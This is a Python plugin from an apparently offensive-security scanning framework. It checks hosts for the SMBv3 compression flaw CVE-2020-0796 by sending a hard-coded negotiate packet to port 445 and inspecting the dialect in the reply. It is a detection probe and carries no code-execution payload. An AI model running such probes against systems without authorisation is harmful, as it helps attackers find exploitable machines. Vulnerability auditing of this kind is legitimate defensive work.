from util.ExpRequest import ExpRequest,Output
import util.globalvar as GlobalVar
import socket
import struct
class WindowsSMBv3():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.flag = GlobalVar.get_value('flag')
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo {}'.format(self.flag))
        self.linux_cmd = env.get('cmd', 'echo {}'.format(self.flag))

    def CVE_2020_0796(self):
        appName = 'WindowsSMBv3'
        pocname = 'CVE_2020_0796'
        method = 'socket'
        payload =  b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        desc = 'Windows : CVE_2020_0796'
        info = 'WindowsSMBv3协议漏洞'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            sock = socket.socket(socket.AF_INET)
            sock.settimeout(3)
            ip = socket.gethostbyname(self.url)
            sock.connect((ip, 445))
            sock.send(payload)
            nb, = struct.unpack(">I", sock.recv(4))
            res = sock.recv(nb)
            if (not res[68:70] == b"\x11\x03") or (not res[70:72] == b"\x02\x00"):
                return output.fail()
            else:
                info = "{}存在WindowsSMBv3协议漏洞(CVE-2020-0796), IP值:{}".format(self.url,ip)
                return output.echo_success(method, info)
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpWindowsSMBv3 = WindowsSMBv3(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpWindowsSMBv3, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(WindowsSMBv3):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpWindowsSMBv3, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)
